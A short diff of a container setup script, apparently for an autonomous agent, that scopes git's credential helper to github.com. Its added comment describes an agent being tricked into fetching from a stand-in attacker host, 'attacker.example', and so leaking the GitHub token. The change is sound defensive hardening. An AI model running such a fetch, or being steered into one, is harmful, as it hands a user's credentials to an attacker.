@@ -114,7 +114,13 @@ git config --global pull.rebase false
 # is stored VERBATIM in ~/.gitconfig, so ${GH_TOKEN} is expanded by the helper
 # shell at git-push time from the process env — not by this script now. The
 # token is never written to disk in the container.
-git config --global credential.helper \
+#
+# SCOPED to https://github.com deliberately. A GLOBAL credential.helper would
+# hand ${GH_TOKEN} to git for ANY https host it authenticates against — so an
+# autonomous agent tricked into `git fetch https://attacker.example/repo` would
+# leak the GitHub token to that host as Basic auth. The URL-scoped key only fires
+# for github.com; no global helper is set, so other hosts get no credential at all.
+git config --global credential.https://github.com.helper \
     '!f() { echo "username=x-access-token"; echo "password=${GH_TOKEN}"; }; f'
 
 log "Configured git identity for ${GIT_USER_NAME}"
